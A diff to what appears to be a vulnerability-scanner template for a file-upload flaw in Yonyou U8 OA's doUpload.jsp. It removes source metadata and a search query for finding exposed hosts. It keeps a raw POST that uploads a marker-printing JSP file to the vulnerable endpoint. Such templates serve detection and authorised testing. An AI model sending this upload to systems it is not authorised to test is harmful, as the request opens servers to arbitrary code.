@@ -3,12 +3,8 @@ info:
   name: 用友U8+OA doUpload.jsp 文件上传漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/kpgt7s30y33rih46'
+  description: ''
   tags: file-upload,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: kpgt7s30y33rih46
-    fofa: '"用友U8-OA" && body="yyoa"'
 http:
 - raw:
   - 'POST /yyoa/portal/tools/doUpload.jsp HTTP/1.1
@@ -29,14 +25,10 @@ http:
     Content-Type: multipart/form-data; boundary=----syowx9dzsw75xlftuop1
 
 
-
-
     ------syowx9dzsw75xlftuop1
 
 
     Content-Disposition: form-data; name="iconFile";filename="dudesite.jsp"
-
-
 
 
     <% out.println("dudesite"); %>
